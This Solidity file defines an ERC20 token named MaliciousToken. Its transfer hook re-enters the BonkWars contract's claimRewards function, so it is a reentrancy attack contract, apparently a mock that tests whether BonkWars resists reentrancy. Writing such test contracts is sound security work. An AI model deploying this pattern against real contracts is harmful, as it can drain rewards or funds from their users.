// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../BonkWars.sol";

contract MaliciousToken is ERC20 {
    BonkWars public bonkWars;
    bytes32 public marketId;
    bool public attacking;

    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function setBonkWars(address _bonkWars, bytes32 _marketId) external {
        bonkWars = BonkWars(_bonkWars);
        marketId = _marketId;
    }

    function _update(address from, address to, uint256 amount) internal virtual override {
        super._update(from, to, amount);
        
        // Only attempt reentrancy during transfers from BonkWars and when bonkWars is set
        if (address(bonkWars) != address(0) && from == address(bonkWars) && !attacking) {
            attacking = true;
            bonkWars.claimRewards(marketId);
            attacking = false;
        }
    }
} 